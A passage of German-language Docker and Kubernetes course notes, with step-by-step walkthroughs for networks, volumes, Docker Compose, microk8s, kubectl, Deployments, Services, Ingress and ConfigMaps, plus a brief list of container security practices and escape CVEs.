ping 172.17.0.3 
```

### Container mit eigenem privatem Netz erstellen


```
clear
## use bridge as type
## docker network create -d bridge test_net
## by bridge is default 
docker network create test_net
docker network ls
docker network inspect test_net

## Container mit netzwerk starten 
docker container run -d --name nginx1 --network test_net nginx
docker network inspect test_net

## Weiteres Netzwerk (bridged) erstellen
docker network create demo_net
docker network connect demo_net nginx1

## Analyse 
docker network inspect demo_net
docker inspect nginx1

## Verbindung lösen 
docker network disconnect demo_net nginx1

## Schauen, wir das Netz jetzt aussieht 
docker network inspect demo_net

```

## Docker-Daten persistent machen / Shared Volumes 

### Überblick


### Overview 

```
bind-mount  # not recommended 
volumes
tmpfs 
```

### Disadvantags 

```
stored only on one node
Does not work well in cluster


```

### Alternative for cluster 

```
glusterfs
cephfs 
nfs 

## Stichwort
ReadWriteMany 


```

### Volumes


### Storage volumes verwalten 

```
docker volume ls
docker volume create test-vol
docker volume ls
docker volume inspect test-vol
```

### Storage volumes in container einhängen

```
## Schritt 1
docker run --rm -it --name container-test-vol --mount type=volume,target=/test_data,source=test-vol ubuntu bash
1234ad# touch /test_data/README 
exit
## stops container 
docker container ls -a
```

```
## Schritt 2:
## create new container and check for /test_data/README 
docker run --rm -it --name=container-test-vol2 --mount type=volume,target=/test_data,source=test-vol ubuntu bash
ab45# ls -la /test_data/README 
```

### Storage volume löschen 

```
## Zunächst container löschen 
docker rm container-test-vol 
docker rm container-test-vol2
docker volume rm test-vol
```

### Alternative with nginx 

```
docker run -d --name nginx --mount target=/test_data,source=test-vol bitnami/nginx:latest 
```


### bind-mounts



### Example 1 

```
## andere Verzeichnis als das Heimatverzeichnis von root funktionieren aktuell nicht mit 
## snap install docker 
## wg. des Confinements 
docker run -d -it  --name devtest --mount type=bind,source=/root,target=/app nginx:latest
docker exec -it devtest bash 
/# cd /app 
```

### Example 2 with /home/kurs 

```
## testen wo der DocumentRoot 
docker run --rm -p 80:80 -it --name=nginx-test nginx bash 

```

### bind-mounts-permissions


### Step: 1

```
## als unpriviligierter Nutzer kurs 
cd
mkdir -p /home/kurs/nginx/html 
cd /home/kurs/nginx/html
echo "hallo welt" > index.html 
sestatus
docker run --rm -it --mount type=bind,source=/home/kurs/nginx/html,target=/usr/share/nginx/html --name=nginx-test nginx bash
exit
```

### Step: 2

```
## Adjust permissions 
cd /home/kurs/nginx/
sudo chown -R kurs:kurs html
## Neue Verzeichnisse und Dateien werden mit der Gruppe kurs angelegt
chmod -R g+s html
setfacl -d -m g::rwx html
docker run --rm -it --mount type=bind,source=/home/kurs/nginx/html,target=/usr/share/nginx/html --name=nginx-test nginx bash
## in container
cd /usr/share/nginx/html
mkdir rootdata
cd rootdata
touch foo

```

## Docker Compose

### yaml-format


```
## Kommentare 

## Listen 
- rot
- gruen
- blau 

## Mappings 
Version: 3.7 

## Mappings können auch Listen enthalten 
expose: 
  - "3000"
  - "8000" 

## Verschachtelte Mappings 
build:
  context: .
  labels: 
    label1: "bunt"
    label2: "hell" 

```

### Ist docker-compose installiert?


```
## besser. mehr infos
docker-compose version 
docker-compose --version 

```

## docker compose direkt als plugin für docker 

```
## Installiert man docker in der neuesten 20.10.21 
## existiert docker als plugin und wird anders aufgerufen 
docker compose 
```


### Example with Wordpress / MySQL



### Schritt 1:
```
clear
cd
mkdir wp
cd wp
nano docker-compose.yml
```

### Schritt 2:

```
## docker-compose.yaml
version: "3.8"

services:
  database:
    image: mysql:5.7
    volumes:
      - database_data:/var/lib/mysql
    restart: always
    environment:
      MYSQL_ROOT_PASSWORD: mypassword
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wordpress
      MYSQL_PASSWORD: wordpress

  wordpress:
    image: wordpress:latest
    depends_on:
      - database
    ports:
      - 8080:80
    restart: always
    environment:
      WORDPRESS_DB_HOST: database:3306
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpress
    volumes:
      - wordpress_plugins:/var/www/html/wp-content/plugins
      - wordpress_themes:/var/www/html/wp-content/themes
      - wordpress_uploads:/var/www/html/wp-content/uploads

volumes:
  database_data:
  wordpress_plugins:
  wordpress_themes:
  wordpress_uploads:


```

### Schritt 3:

```
docker-compose up -d 
```

### Example with Wordpress / Nginx / MariadB


### Exercise 

```
cd
mkdir wp 
cd wp
```

```
nano docker-compose.yml 
```

```yaml
services:
    database:
        image: mysql:5.7
        volumes:
            - database_data:/var/lib/mysql
        restart: always
        environment:
            MYSQL_ROOT_PASSWORD: mypassword
            MYSQL_DATABASE: wordpress
            MYSQL_USER: wordpress
            MYSQL_PASSWORD: wordpress

    wordpress:
        image: wordpress:latest
        depends_on:
            - database
        ports:
            - 8080:80
        restart: always
        environment:
            WORDPRESS_DB_HOST: database:3306
            WORDPRESS_DB_USER: wordpress
            WORDPRESS_DB_PASSWORD: wordpress
        volumes:
            - wordpress_plugins:/var/www/html/wp-content/plugins
            - wordpress_themes:/var/www/html/wp-content/themes
            - wordpress_uploads:/var/www/html/wp-content/uploads
volumes:
    database_data:
    wordpress_plugins:
    wordpress_themes:
    wordpress_uploads:
```


```console
## now start the system
docker compose up -d
## containers running & ports
docker compose ps 


## we can do some test if db is reachable 
docker exec -it wp-wordpress-1 bash 
## within shell do 
apt update 
apt-get install -y telnet
## this should work 
telnet database 3306

## and we even have logs
docker compose logs 

## 
docker compose down 
```

### Exercise 2: Unter anderem Nutzer laufen lassen 

```
cd 
cd wp
```

```
nano docker-compose.yml
```

```yaml
services:
    database:
        image: mysql:5.7
        volumes:
            - database_data:/var/lib/mysql
        restart: always
        environment:
            MYSQL_ROOT_PASSWORD: mypassword
            MYSQL_DATABASE: wordpress
            MYSQL_USER: wordpress
            MYSQL_PASSWORD: wordpress

    wordpress:
        image: wordpress:latest
        #### Hier kommt der user rein ###
        #### userid muss nicht in /etc/passwd im Container existieren 
        user: "10000"
        depends_on:
            - database
        ports:
            - 8080:80
        restart: always
        environment:
            WORDPRESS_DB_HOST: database:3306
            WORDPRESS_DB_USER: wordpress
            WORDPRESS_DB_PASSWORD: wordpress
        volumes:
            - wordpress_plugins:/var/www/html/wp-content/plugins
            - wordpress_themes:/var/www/html/wp-content/themes
            - wordpress_uploads:/var/www/html/wp-content/uploads
volumes:
    database_data:
    wordpress_plugins:
    wordpress_themes:
    wordpress_uploads:
```

```
docker compose down
docker compose up -d
```

```
## Überprüfung
docker exec -it wp-wordpress-1 bash
```

```
## in der bash - zeigt uns die User-id an 
id
```

### Example with Ubuntu and Dockerfile


### Schritt 1:

```
cd
mkdir bautest
cd bautest 
```

### Schritt 2:

```
## nano docker-compose.yml
version: "3.8"

services:
  myubuntu:
    build: ./myubuntu
    restart: always
```

### Schritt 3:

```
mkdir myubuntu 
cd myubuntu 
```

```
nano hello.sh
```

```
##!/bin/bash
let i=0

while true
do
  let i=i+1
  echo $i:hello-docker
  sleep 5
done

```

```
## nano Dockerfile 
FROM ubuntu:latest
RUN apt-get update; apt-get install -y inetutils-ping
COPY hello.sh .
RUN chmod u+x hello.sh
CMD ["/hello.sh"]

```

### Schritt 4: 


```
cd ../
## wichtig, im docker-compose - Ordner seiend 
##pwd 
##~/bautest
docker compose up -d 
## wird image gebaut und container gestartet 

## Bei Veränderung vom Dockerfile, muss man den Parameter --build mitangeben 
docker compose up -d --build 
```

### Logs in docker - compose


```
##Im Ordner des Projektes
##z.B wordpress-mysql-compose-project 
cd ~/wordpress-mysql-compose-project 
docker-compose logs
## jetzt werden alle logs aller services angezeigt 
```

### docker-compose und replicas


### Beispiel 

```
version: "3.9"
services:
  redis:
    image: redis:latest
    deploy:
      replicas: 1
    configs:
      - my_config
      - my_other_config
configs:
  my_config:
    file: ./my_config.txt
  my_other_config:
    external: true
```
### Ref:

  * https://docs.docker.com/compose/compose-file/compose-file-v3/

### docker compose Reference

  * https://docs.docker.com/compose/compose-file/compose-file-v3/

## Docker Security 

### Docker Security


**Image-Security**
- Minimal Base Images (distroless, Chainguard, Wolfi, Alpine vs. Debian-slim Trade-offs)
- Multi-Stage Builds, kein Build-Toolchain im Runtime-Image
- Image Scanning: Trivy, Grype, Snyk – CI-Integration
- SBOM-Generierung (Syft) und Vulnerability-Tracking
- Supply Chain: Image Signing mit cosign/Sigstore, Verifikation per Policy

**Dockerfile Best Practices**
- `USER` non-root, fixe UID/GID
- `COPY --chown`, keine Secrets in Layern (Buildkit Secrets/SSH)
- `.dockerignore`, reproducible builds, Pinning per Digest statt Tag
- HEALTHCHECK, sinnvoller ENTRYPOINT (kein Shell-Form)

**Runtime**
- Capabilities droppen (`--cap-drop=ALL`, gezielt zurückgeben)
- `--read-only` root fs + tmpfs Mounts
- seccomp/AppArmor Profile, no-new-privileges
- User Namespaces, Rootless Docker / Podman als Alternative
- Resource Limits (cgroups) als Security-Maßnahme (DoS-Schutz)

**Container Escapes – konkrete CVE-Beispiele**
- CVE-2019-5736 (runC overwrite)
- CVE-2022-0185 (fsconfig)
- CVE-2024-21626 "Leaky Vessels" (runC fd leak)
- Klassiker: privileged container, Docker socket mount, hostPath

### Scanning docker image with docker scan/snyx


### Prerequisites 

```
You need to be logged in on docker hub with docker login 
(with your account credentials
```


### Example 

```
## Snyk (docker scan) 
docker help scan
docker scan --json --accept-license dockertrainereu/jm-hello-docker  > result.json
```

## Docker - Dokumentation 

### Vulnerability Scanner with docker

  * https://docs.docker.com/engine/scan/#prerequisites

### Vulnerability Scanner mit snyk

  * https://snyk.io/plans/

### Parent/Base - Image bauen für Docker

  * https://docs.docker.com/develop/develop-images/baseimages/

### Installation Ubuntu - snap


### Walkthrough

```
sudo snap install microk8s --classic
microk8s status

## Sobald Kubernetes zur Verfügung steht aktivieren wir noch das plugin dns
microk8s status
```

### Optional

```
## Execute kubectl commands like so 
microk8s kubectl
microk8s kubectl cluster-info

## Make it easier with an alias 
echo "alias kubectl='microk8s kubectl'" >> ~/.bashrc
source ~/.bashrc
kubectl

```
### Working with snaps 

```
snap info microk8s 

```

### Ref:

  * https://microk8s.io/docs/setting-snap-channel

### Create a cluster with microk8s


### Walkthrough 

```
## auf master (jeweils für jedes node neu ausführen)
microk8s add-node

## dann auf jeweiligem node vorigen Befehl der ausgegeben wurde ausführen
## Kann mehr als 60 sekunden dauern ! Geduld...Geduld..Geduld 
##z.B. -> ACHTUNG evtl. IP ändern 
microk8s join 10.128.63.86:25000/567a21bdfc9a64738ef4b3286b2b8a69

```

### Auf einem Node addon aktivieren z.B. ingress

```
gucken, ob es auf dem anderen node auch aktiv ist. 
```

### Ref:

  * https://microk8s.io/docs/high-availability

### Remote-Verbindung zu Kubernetes (microk8s) einrichten


```
## on CLIENT install kubectl 
sudo snap install kubectl --classic 

## On MASTER -server get config 
## als root
cd
microk8s config > /home/kurs/remote_config 

## Download (scp config file) and store in .kube - folder  
cd ~
mkdir .kube
cd .kube  # Wichtig: config muss nachher im verzeichnis .kube liegen 
## scp kurs@master_server:/path/to/remote_config config 
## z.B. 
scp kurs@192.168.56.102:/home/kurs/remote_config config
## oder benutzer 11trainingdo
scp 11trainingdo@192.168.56.102:/home/11trainingdo/remote_config config 

##### Evtl. IP-Adresse in config zum Server aendern 

## Ultimative 1. Test auf CLIENT 
kubectl cluster-info 

## or if using kubectl or alias 
kubectl get pods 

## if you want to use a different kube config file, you can do like so 
kubectl --kubeconfig /home/myuser/.kube/myconfig

```

### Bash completion installieren


### Walkthrough 

```
## Eventuell, wenn bash-completion nicht installiert ist.
apt install bash-completion
source /usr/share/bash-completion/bash_completion
## is it installed properly 
type _init_completion
```

```
## activate for all users 
kubectl completion bash | sudo tee /etc/bash_completion.d/kubectl > /dev/null

## verifizieren - neue login shell
su -

## zum Testen
kubectl g<TAB> 
kubectl get 
```
### Alternative für k als alias für kubectl 

```
source <(kubectl completion bash)
complete -F __start_kubectl k

```

### Reference 

  * https://kubernetes.io/docs/tasks/tools/included/optional-kubectl-configs-bash-linux/

### vim support for yaml


### Ubuntu (im Unterverzeichnis /etc/vim/vimrc.local - systemweit) 

```
hi CursorColumn cterm=NONE ctermbg=lightred ctermfg=white
autocmd FileType y?ml setlocal ts=2 sts=2 sw=2 ai number expandtab cursorline cursorcolumn
```

### Testen 

```
vim test.yml 
Eigenschaft: <return> # springt eingerückt in die nächste Zeile um 2 spaces eingerückt

## evtl funktioniert vi test.yml auf manchen Systemen nicht, weil kein vim (vi improved) 


```

### nano-support for yaml


### Ubuntu (im Unterverzeichnis /etc/nanorc - systemweit) 

#### Schritt 1: Wir testen die Version

```
## - Es sollte mindestens die Version 5.9
## - Die kommt mit der Datei für Syntax-Highlightning
nano --version
```

#### Schritt 2: Konfigurationen setzen 

```
## 2.1 Syntax Hightlightning 
echo "include /usr/share/nano/yaml.nanorc" >> /etc/nanorc 
## 2.2 Automatische Einrückung 
echo "set autoindent" >> /etc/nanorc
## 2.3 Einrückung durch Tab 2 Stellen 
echo "set tabsize 2" >> /etc/nanorc
## 2.4 Tabs werden automatisch in Leerzeichen umgewandelt
## - yaml mag keine TAB-Zeichen
echo "set tabstospaces" >> /etc/nanorc 
```

#### Schritt 3: Testen 

```
nano test.yml 
```

#### Schritt 4: Jetzt im Nano gib' ein:

```
test:
## Wow, es funktioniert, die Farben sind da.
```

#### Schritt 5: Verlasse nano 

```
CTRL + x
```

#### Schritt 6: Nano fragt Dich:

```
## Save modified buffer ?
## Du drückst die Taste:
n 
```

### Ingress controller in microk8s aktivieren


### Aktivieren

```
microk8s enable ingress
```

### Referenz 

  * https://microk8s.io/docs/addon-ingress

## Kubernetes Praxis API-Objekte 

### Das Tool kubectl (Devs/Ops) - Spickzettel


### Allgemein 

```
## Zeige Information über das Cluster 
kubectl cluster-info 

## Welche api-resources gibt es ?
kubectl api-resources 

## Hilfe zu object und eigenschaften bekommen
kubectl explain pod 
kubectl explain pod.metadata
kubectl explain pod.metadata.name 

```

### Arbeiten mit manifesten 

```
kubectl apply -f nginx-replicaset.yml 
## Wie ist aktuell die hinterlegte config im system
kubectl get -o yaml -f nginx-replicaset.yml 

## Änderung in nginx-replicaset.yml z.B. replicas: 4 
## dry-run - was wird geändert 
kubectl diff -f nginx-replicaset.yml 

## anwenden 
kubectl apply -f nginx-replicaset.yml 

## Alle Objekte aus manifest löschen
kubectl delete -f nginx-replicaset.yml 


```

### Ausgabeformate 

```
## Ausgabe kann in verschiedenen Formaten erfolgen 
kubectl get pods -o wide # weitere informationen 
## im json format
kubectl get pods -o json 

## gilt natürluch auch für andere kommandos
kubectl get deploy -o json 
kubectl get deploy -o yaml 
```



### Zu den Pods 

```
## Start einen pod // BESSER: direkt manifest verwenden
## kubectl run podname image=imagename 
kubectl run nginx image=nginx 

## Pods anzeigen 
kubectl get pods 
kubectl get pod
## Format weitere Information 
kubectl get pod -o wide 
## Zeige labels der Pods
kubectl get pods --show-labels 

## Zeige pods mit einem bestimmten label 
kubectl get pods -l app=nginx 

## Status eines Pods anzeigen 
kubectl describe pod nginx 

## Pod löschen 
kubectl delete pod nginx 

## Kommando in pod ausführen 
kubectl exec -it nginx -- bash 

```

### Arbeiten mit namespaces 

```
## Welche namespaces auf dem System 
kubectl get ns 
kubectl get namespaces 
## Standardmäßig wird immer der default namespace verwendet 
## wenn man kommandos aufruft 
kubectl get deployments 

## Möchte ich z.B. deployment vom kube-system (installation) aufrufen, 
## kann ich den namespace angeben
kubectl get deployments --namespace=kube-system 
kubectl get deployments -n kube-system 

## wir wollen unseren default namespace ändern 
kubectl config set-context --current --namespace <dein-namespace>
```



### Referenz

  * https://kubernetes.io/de/docs/reference/kubectl/cheatsheet/

### kubectl example with run


### Beispiel 1 (das funktioniert)

```
## Zeigt mir die Pods die laufen
kubectl get pods 

## Aufbau des Befehls  
## kubectl run NAME --image=IMAGE_EG_FROM_DOCKER

## Ein Beispiel
kubectl run nginx --image=nginx:1.25.1

kubectl get pods 
## Alle nodes anzeigen
kubectl get nodes -o wide 
## Auf welchem Node läuft der Pods
kubectl get pods -o wide 
```

### Beispiel 2 (das nicht funktioniert !!)

```
kubectl run sonnenschein --image=foo2
## Ergebnis-> pod/sonnenschein created
## ABER: 
## ImageErrPull - Image konnte nicht geladen werden  => bedeutet pod läuft nicht, obwohl nicht 
kubectl get pods 
## Weitere status - info 
kubectl describe pods sonnenschein
```

### Beide Pods wieder löschen

```
kubectl delete pods nginx foo2 
kubectl get pods
```

### Referenz:

  * https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands#run

### Bauen einer Applikation mit Resource Objekten


![Bauen einer Webanwendung](images/WebApp.drawio.png)

### kubectl/manifest/pod


### Walkthrough 

```
cd 
mkdir -p manifests
cd manifests
mkdir -p web
cd web
```

```
## vi nginx-static.yml 
nano nginx-static.yml
```

```
apiVersion: v1
kind: Pod
metadata:
  name: nginx-static-web
  labels:
    webserver: nginx
spec:
  containers:
  - name: web
    image: nginx:1.25.1

```

```
kubectl apply -f nginx-static.yml 
kubectl describe pod nginx-static-web 
## Zeige die Konfiguration
kubectl get pod/nginx-static-web -o yaml
kubectl get pod/nginx-static-web -o wide 
```

### kubectl/manifest/replicaset


```
cd
mkdir -p manifests
cd manifests
mkdir 02-rs 
cd 02-rs 
vi rs.yml
```

```
apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: nginx-replica-set
spec:
  replicas: 2
  selector:
    matchLabels:
      tier: frontend
  template:
    metadata:
      name: template-nginx-replica-set
      labels:
        tier: frontend
    spec:
      containers:
        - name: nginx
          image: nginx:1.21
          ports:
            - containerPort: 80
             

             
```

```
kubectl apply -f rs.yml 
```

### kubectl/manifest/deployments


```
cd
cd manifests
mkdir 03-deploy
cd 03-deploy 
nano deploy.yml 
```

```

## vi deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: nginx-deployment
spec:
  selector:
    matchLabels:
      app: nginx
  replicas: 8 
  template:
    metadata:
      labels:
        app: nginx
    spec:
      containers:
      - name: nginx
        image: nginx:1.21
        ports:
        - containerPort: 80
        
```

```
kubectl apply -f deploy.yml 
```

### Explore 

```
kubectl get all
```

### Optional: Change image - Version 

```
nano nginx-deployment.yml 
```


#### Version 1: (optical nicer)

```
## Ändern des images von nginx:1.21 -> auf 1.22
## danach 
kubectl apply -f . && watch kubectl get pods 
```

#### Version 2: 

```
## Ändern des images von nginxinc/nginx-unprivileged:1.28 -> auf 1.29
## danach 
kubectl apply -f . && kubectl get all && kubectl get pods -w
```

### Services - Aufbau


![Services Aufbau](/images/kubernetes-services.drawio.svg)

### kubectl/manifest/service


### Warum Services ? 

  * Wenn in einem Deployment bei einem Wechsel des images neue Pods erstellt werden, erhalten diese eine neue IP-Adresse
  * Nachteil: Man müsste diese dann in allen Applikation ständig ändern, die auf die Pods zugreifen.
  * Lösung: Wir schalten einen Service davor !

### Hintergrund IP-Wechsel 
 
 <img width="930" height="134" alt="image" src="https://github.com/user-attachments/assets/26c16134-1f2a-4b42-8cca-355099d08604" />

 * Image-Version wurde jetzt in Deployment geändert, Ergebnis:

<img width="939" height="137" alt="image" src="https://github.com/user-attachments/assets/fb5a665b-98a7-445b-8ec7-27f12c2267e1" />


### Example 1: ClusterIP

#### Schritt 1: Deployment 

```
cd
mkdir -p manifests
cd manifests 
mkdir 04-service 
cd 04-service 
```

```
nano 01-deploy.yml
```

```
## 01-deploy.yml 
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-nginx
spec:
  selector:
    matchLabels:
      run: my-nginx
  replicas: 3
  template:
    metadata:
      labels:
        run: my-nginx
    spec:
      containers:
      - name: my-nginx
        image: nginx
        ports:
        - containerPort: 80
```

```
kubectl apply -f .
```

#### Schritt 2:

```
nano 02-svc.yml
```

```
## 02-svc.yml 
apiVersion: v1
kind: Service
metadata:
  name: my-nginx
spec:
  ports:
  - port: 80
    protocol: TCP
  selector:
    run: my-nginx
```

```
kubectl apply -f . 
```

```
## wie ist die ClusterIP ?  
kubectl get all
kubectl get svc my-nginx
## Find endpoints / did svc find pods ?
kubectl describe svc my-nginx 
```

#### Schritt 3: Deployment löschen 

```
kubectl delete -f 01-deploy.yml
## Keine endpunkte mehr 
kubectl describe svc my-nginx
```

 ### Schritt 4: Deployment wieder erstellen 

```
kubectl apply -f .
## Endpunkte wieder da
kubectl describe svc my-nginx
```

### Example II : Short version (NodePort)

```
## Wo sind wir ?
## cd; cd manifests/04-service 
```

```
nano 02-svc.yml
## in Zeile type: 
## ClusterIP ersetzt durch NodePort 

kubectl apply -f .
## NodePort ab 30.000 ausfindig machen
kubectl get svc
```

<img width="793" height="44" alt="image" src="https://github.com/user-attachments/assets/16bf90d4-7c3f-4c8f-9846-2ff5d0e63fcf" />

```
kubectl get nodes -o wide
```

<img width="926" height="157" alt="image" src="https://github.com/user-attachments/assets/eb396f36-cff1-4b6d-b136-e110fff1c807" />

```
## im client Externe NodeIP und NodePort verwenden 
curl http://164.92.193.245:32708
```

### Example III: Service mit LoadBalancer (ExternalIP)

```
cd; cd manifests/04-service 
nano 02-svc.yml
## in Zeile type: 
## NodePort ersetzt durch LoadBalancer  

kubectl apply -f .
kubectl get svc svc-nginx

kubectl describe svc my-nginx
## hier heisst das nicht External-IP ->
## sondern
```

<img width="775" height="63" alt="image" src="https://github.com/user-attachments/assets/3f1db219-e5d8-4bbf-a001-17fc5eaae93f" />

```
kubectl get svc my-nginx -w 
## spätestens nach 5 Minuten bekommen wir eine externe ip
## z.B. 41.32.44.45

curl http://41.32.44.45 
```



### Ref.

  * https://kubernetes.io/docs/concepts/services-networking/connect-applications-service/

### Hintergrund Ingress




### Ref. / Dokumentation 

  * https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html

### Ingress Controller auf Digitalocean (doks) mit helm installieren


### Basics 

  * Das Verfahren funktioniert auch so auf anderen Plattformen, wenn helm verwendet wird und noch kein IngressController vorhanden
  * Ist kein IngressController vorhanden, werden die Ingress-Objekte zwar angelegt, es funktioniert aber nicht. 

### Prerequisites 

  * kubectl muss eingerichtet sein 

### Walkthrough (Setup Ingress Controller) 

```
helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
helm repo update
helm show values ingress-nginx/ingress-nginx

## It will be setup with type loadbalancer - so waiting to retrieve an ip from the external loadbalancer
## This will take a little. 
helm install nginx-ingress ingress-nginx/ingress-nginx --namespace ingress --create-namespace --set controller.publishService.enabled=true 

## See when the external ip comes available
kubectl -n ingress get all
kubectl --namespace ingress get services -o wide -w nginx-ingress-ingress-nginx-controller

## Output  
NAME                                     TYPE           CLUSTER-IP     EXTERNAL-IP      PORT(S)                      AGE     SELECTOR
nginx-ingress-ingress-nginx-controller   LoadBalancer   10.245.78.34   157.245.20.222   80:31588/TCP,443:30704/TCP   4m39s   app.kubernetes.io/component=controller,app.kubernetes.io/instance=nginx-ingress,app.kubernetes.io/name=ingress-nginx

## Now setup wildcard - domain for training purpose 
## inwx.com
*.lab1.t3isp.de A 157.245.20.222 


```


### Documentation for default ingress nginx

  * https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/configmap/

### Beispiel Ingress


### Prerequisits

```
## Ingress Controller muss aktiviert sein 
microk8s enable ingress
```

### Walkthrough 

#### Schritt 1:

```
cd 
mkdir -p manifests
cd manifests 
mkdir abi
cd abi 
```


```
## apple.yml 
## vi apple.yml 
kind: Pod
apiVersion: v1
metadata:
  name: apple-app
  labels:
    app: apple
spec:
  containers:
    - name: apple-app
      image: hashicorp/http-echo
      args:
        - "-text=apple"
---

kind: Service
apiVersion: v1
metadata:
  name: apple-service
spec:
  selector:
    app: apple
  ports:
    - protocol: TCP
      port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f apple.yml 
```

```
## banana
## vi banana.yml
kind: Pod
apiVersion: v1
metadata:
  name: banana-app
  labels:
    app: banana
spec:
  containers:
    - name: banana-app
      image: hashicorp/http-echo
      args:
        - "-text=banana"

---

kind: Service
apiVersion: v1
metadata:
  name: banana-service
spec:
  selector:
    app: banana
  ports:
    - port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f banana.yml
```

#### Schritt 2:

```
## Ingress
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
spec:
  ingressClassName: nginx
  rules:
  - http:
      paths:
        - path: /apple
          backend:
            serviceName: apple-service
            servicePort: 80
        - path: /banana
          backend:
            serviceName: banana-service
            servicePort: 80
```

```
## ingress 
kubectl apply -f ingress.yml
kubectl get ing 
```

### Reference 

  * https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html

### Find the problem 

```
## Hints 

## 1. Which resources does our version of kubectl support 
## Can we find Ingress as "Kind" here.
kubectl api-ressources 

## 2. Let's see, how the configuration works 
kubectl explain --api-version=networking.k8s.io/v1 ingress.spec.rules.http.paths.backend.service

## now we can adjust our config 
```

### Solution

```
## in kubernetes 1.22.2 - ingress.yml needs to be modified like so.
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
spec:
  ingressClassName: nginx
  rules:
  - http:
      paths:
        - path: /apple
          pathType: Prefix
          backend:
            service:
              name: apple-service
              port:
                number: 80
        - path: /banana
          pathType: Prefix
          backend:
            service:
              name: banana-service
              port:
                number: 80                
```

### Install Ingress On Digitalocean DOKS

### Beispiel mit Hostnamen


### Prerequisits

```
## Ingress Controller muss aktiviert sein 
### Nur der Fall wenn man microk8s zum Einrichten verwendet 
### Ubuntu 
microk8s enable ingress
```

### Walkthrough 

#### Step 1: pods and services

```
cd
mkdir -p manifests
cd manifests 
mkdir abi
cd abi
```

```
## apple.yml 
## vi apple.yml 
kind: Pod
apiVersion: v1
metadata:
  name: apple-app
  labels:
    app: apple
spec:
  containers:
    - name: apple-app
      image: hashicorp/http-echo
      args:
        - "-text=apple-<dein-name>"
---

kind: Service
apiVersion: v1
metadata:
  name: apple-service
spec:
  selector:
    app: apple
  ports:
    - protocol: TCP
      port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f apple.yml 
```

```
## banana
## vi banana.yml
kind: Pod
apiVersion: v1
metadata:
  name: banana-app
  labels:
    app: banana
spec:
  containers:
    - name: banana-app
      image: hashicorp/http-echo
      args:
        - "-text=banana-<dein-name>"

---

kind: Service
apiVersion: v1
metadata:
  name: banana-service
spec:
  selector:
    app: banana
  ports:
    - port: 80
      targetPort: 5678 # Default port for image
```

```
kubectl apply -f banana.yml
```

### Step 2: Ingress 

```
## Ingress
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
    # with the ingress controller from helm, you need to set an annotation 
    # otherwice it does not know, which controller to use
    # old version... use ingressClassName instead 
    # kubernetes.io/ingress.class: nginx
spec:
  ingressClassName: nginx
  rules:
  - host: "<euername>.lab<nr>.t3isp.de"
    http:
      paths:
        - path: /apple
          backend:
            serviceName: apple-service
            servicePort: 80
        - path: /banana
          backend:
            serviceName: banana-service
            servicePort: 80
```

```
## ingress 
kubectl apply -f ingress.yml
kubectl get ing 
```

### Reference 

  * https://matthewpalmer.net/kubernetes-app-developer/articles/kubernetes-ingress-guide-nginx-example.html

### Find the problem 

```
## Hints 

## 1. Which resources does our version of kubectl support 
## Can we find Ingress as "Kind" here.
kubectl api-ressources 

## 2. Let's see, how the configuration works 
kubectl explain --api-version=networking.k8s.io/v1 ingress.spec.rules.http.paths.backend.service

## now we can adjust our config 
```

### Solution

```
## in kubernetes 1.22.2 - ingress.yml needs to be modified like so.
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: example-ingress
  annotations:
    ingress.kubernetes.io/rewrite-target: /
    # with the ingress controller from helm, you need to set an annotation 
    # old version useClassName instead 
    # otherwice it does not know, which controller to use
    # kubernetes.io/ingress.class: nginx 
spec:
  ingressClassName: nginx
  rules:
  - host: "app12.lab.t3isp.de"
    http:
      paths:
        - path: /apple
          pathType: Prefix
          backend:
            service:
              name: apple-service
              port:
                number: 80
        - path: /banana
          pathType: Prefix
          backend:
            service:
              name: banana-service
              port:
                number: 80                
```

### Achtung: Ingress mit Helm - annotations

### Permanente Weiterleitung mit Ingress


### Example

```
## redirect.yml 
apiVersion: v1
kind: Namespace
metadata:
  name: my-namespace

---

apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    nginx.ingress.kubernetes.io/permanent-redirect: https://www.google.de
    nginx.ingress.kubernetes.io/permanent-redirect-code: "308"
  creationTimestamp: null
  name: destination-home
  namespace: my-namespace
spec:
  rules:
  - host: web.training.local
    http:
      paths:
      - backend:
          service:
            name: http-svc
            port:
              number: 80
        path: /source
        pathType: ImplementationSpecific
```

```
Achtung: host-eintrag auf Rechner machen, von dem aus man zugreift 

/etc/hosts 
45.23.12.12 web.training.local
```


```
curl -I  http://web.training.local/source
HTTP/1.1 308 
Permanent Redirect 

```

### Umbauen zu google ;o) 

```
This annotation allows to return a permanent redirect instead of sending data to the upstream. For example nginx.ingress.kubernetes.io/permanent-redirect: https://www.google.com would redirect everything to Google.

```

### Refs:

  * https://github.com/kubernetes/ingress-nginx/blob/main/docs/user-guide/nginx-configuration/annotations.md#permanent-redirect
  * 

### ConfigMap Example


### Schritt 1: configmap vorbereiten 
```
cd 
mkdir -p manifests 
cd manifests
mkdir configmaptests 
cd configmaptests
nano 01-configmap.yml
```

```
### 01-configmap.yml
kind: ConfigMap 
apiVersion: v1 
metadata:
  name: example-configmap 
data:
  # als Wertepaare
  database: mongodb
  database_uri: mongodb://localhost:27017
```

```
kubectl apply -f 01-configmap.yml 
kubectl get cm
kubectl get cm -o yaml
```

### Schritt 2: Beispiel als Datei 


```
nano 02-pod.yml
```

```
kind: Pod 
apiVersion: v1 
metadata:
  name: pod-mit-configmap 

spec:
